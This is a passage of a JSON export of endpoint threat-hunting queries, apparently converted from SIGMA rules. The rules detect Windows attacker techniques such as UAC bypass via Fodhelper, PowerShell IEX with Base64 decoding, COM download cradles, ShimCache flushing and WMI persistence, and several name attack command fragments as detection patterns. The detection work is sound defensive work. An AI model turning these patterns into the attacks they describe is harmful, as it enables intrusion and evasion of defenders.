            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \" /create \") and (tgt.process.cmdline contains \":\\Perflogs\" or tgt.process.cmdline contains \":\\Users\\All Users\\\" or tgt.process.cmdline contains \":\\Users\\Default\\\" or tgt.process.cmdline contains \":\\Users\\Public\" or tgt.process.cmdline contains \":\\Windows\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Local\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Public%\")) or (src.process.cmdline contains \"\\svchost.exe -k netsvcs -p -s Schedule\" and (tgt.process.cmdline contains \":\\Perflogs\" or tgt.process.cmdline contains \":\\Windows\\Temp\" or tgt.process.cmdline contains \"\\Users\\Public\" or tgt.process.cmdline contains \"%Public%\"))) and (not ((src.process.cmdline contains \"unattended.ini\" or tgt.process.cmdline contains \"update_task.xml\") or tgt.process.cmdline contains \"/Create /TN TVInstallRestore /TR\" or (tgt.process.cmdline contains \"/Create /Xml \\\"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\.CR.\" and tgt.process.cmdline contains \"Avira_Security_Installation.xml\") or ((tgt.process.cmdline contains \"/Create /F /TN\" and tgt.process.cmdline contains \"/Xml \" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\is-\" and tgt.process.cmdline contains \"Avira_\") and (tgt.process.cmdline contains \".tmp\\UpdateFallbackTask.xml\" or tgt.process.cmdline contains \".tmp\\WatchdogServiceControlManagerTimeout.xml\" or tgt.process.cmdline contains \".tmp\\SystrayAutostart.xml\" or tgt.process.cmdline contains \".tmp\\MaintenanceTask.xml\")) or (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" and tgt.process.cmdline contains \"/Create /TN \\\"klcp_update\\\" /XML \" and tgt.process.cmdline contains \"\\klcp_update_task.xml\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 194
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious winrar execution in a folder which is not the default installation folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Winrar Execution in Non-Standard Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.image.path contains \"\\winrar.exe\") or tgt.process.displayName=\"Command line RAR\") and (not (tgt.process.image.path contains \"\\UnRAR.exe\" or (tgt.process.image.path contains \":\\Program Files (x86)\\WinRAR\\\" or tgt.process.image.path contains \":\\Program Files\\WinRAR\\\"))) and (not tgt.process.image.path contains \":\\Windows\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 195
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the rare use of the command line tool shutdown to logoff a user",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1529"
            ],
            "name": "Suspicious Execution of Shutdown to Log Out",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\shutdown.exe\" and tgt.process.cmdline contains \"/l\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 196
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of the commandline to shutdown or reboot windows",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1529"
            ],
            "name": "Suspicious Execution of Shutdown",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\shutdown.exe\" and (tgt.process.cmdline contains \"/r \" or tgt.process.cmdline contains \"/s \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 197
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Bypass UAC via Fodhelper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\fodhelper.exe\") | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 198
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of COM objects that can be abused to download files in PowerShell by CLSID",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Potential COM Objects Download Cradles Usage - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"[Type]::GetTypeFromCLSID(\" and (tgt.process.cmdline contains \"0002DF01-0000-0000-C000-000000000046\" or tgt.process.cmdline contains \"F6D90F16-9C73-11D3-B32E-00C04F990BB4\" or tgt.process.cmdline contains \"F5078F35-C551-11D3-89B9-0000F81FE221\" or tgt.process.cmdline contains \"88d96a0a-f192-11d4-a65f-0040963251e5\" or tgt.process.cmdline contains \"AFBA6B42-5692-48EA-8141-DC517DCF0EF1\" or tgt.process.cmdline contains \"AFB40FFD-B609-40A3-9828-F88BBE11E4E3\" or tgt.process.cmdline contains \"88d96a0b-f192-11d4-a65f-0040963251e5\" or tgt.process.cmdline contains \"2087c2f4-2cef-4953-a8ab-66779b670495\" or tgt.process.cmdline contains \"000209FF-0000-0000-C000-000000000046\" or tgt.process.cmdline contains \"00024500-0000-0000-C000-000000000046\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 199
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to run Invoke-Execution using IEX alias",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell IEX Execution Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" | iex;\" or tgt.process.cmdline contains \" | iex \" or tgt.process.cmdline contains \" | iex}\" or tgt.process.cmdline contains \" | IEX ;\" or tgt.process.cmdline contains \" | IEX -Error\" or tgt.process.cmdline contains \" | IEX (new\" or tgt.process.cmdline contains \");IEX \")) and (tgt.process.cmdline contains \"::FromBase64String\" or tgt.process.cmdline contains \".GetString([System.Convert]::\")) or (tgt.process.cmdline contains \")|iex;$\" or tgt.process.cmdline contains \");iex($\" or tgt.process.cmdline contains \");iex $\" or tgt.process.cmdline contains \" | IEX | \" or tgt.process.cmdline contains \" | iex\\\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 200
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Windows App Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"C:\\Program Files\\WindowsApps\\\" and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"Base64\")) and (not (src.process.image.path contains \":\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal\" and src.process.image.path contains \"\\WindowsTerminal.exe\" and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 201
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts of decoding a base64 Gzip archive via PowerShell. This technique is often used as a method to load malicious content into memory afterward.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1132"
            ],
            "name": "Suspicious FromBase64String Usage On Gzip Archive - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"FromBase64String\" and tgt.process.cmdline contains \"MemoryStream\" and tgt.process.cmdline contains \"H4sI\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 202
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Suspicious New Service Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" and tgt.process.cmdline contains \"binPath=\")) or (tgt.process.cmdline contains \"New-Service\" and tgt.process.cmdline contains \"-BinaryPathName\")) and (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"svchost\" or tgt.process.cmdline contains \"dllhost\" or tgt.process.cmdline contains \"cmd \" or tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"C:\\Users\\Public\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" or tgt.process.cmdline contains \"C:\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 203
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Rar Usage with Password and Compression Level",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -hp\" and (tgt.process.cmdline contains \" -m\" or tgt.process.cmdline contains \" a \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 204
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect indirect command execution via Program Compatibility Assistant pcwrun.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Indirect Command Execution By Program Compatibility Wizard",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\pcwrun.exe\") | columns ComputerName,tgt.process.user,src.process.cmdline,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 205
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects actions that clear the local ShimCache and remove forensic evidence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "ShimCache Flush",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"apphelp.dll\") and (tgt.process.cmdline contains \"ShimFlushCache\" or tgt.process.cmdline contains \"#250\")) or ((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"kernel32.dll\") and (tgt.process.cmdline contains \"BaseFlushAppcompatCache\" or tgt.process.cmdline contains \"#46\")))) | columns tgt.process.image.path,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 206
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation CLIP+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cmd\" and tgt.process.cmdline contains \"&&\" and tgt.process.cmdline contains \"clipboard]::\" and tgt.process.cmdline contains \"-f\") and (tgt.process.cmdline contains \"/c\" or tgt.process.cmdline contains \"/r\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 207
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Suspicious ScreenSave Change by Reg.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" or tgt.process.cmdline contains \"HKCU\\Control Panel\\Desktop\")) and ((tgt.process.cmdline contains \"/v ScreenSaveActive\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d 1\" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v ScreenSaveTimeout\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v ScreenSaverIsSecure\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d 0\" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v SCRNSAVE.EXE\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \".scr\" and tgt.process.cmdline contains \"/f\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 208
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "New ActiveScriptEventConsumer Created Via Wmic.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ActiveScriptEventConsumer\" and tgt.process.cmdline contains \" CREATE \")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 209
    },
    {
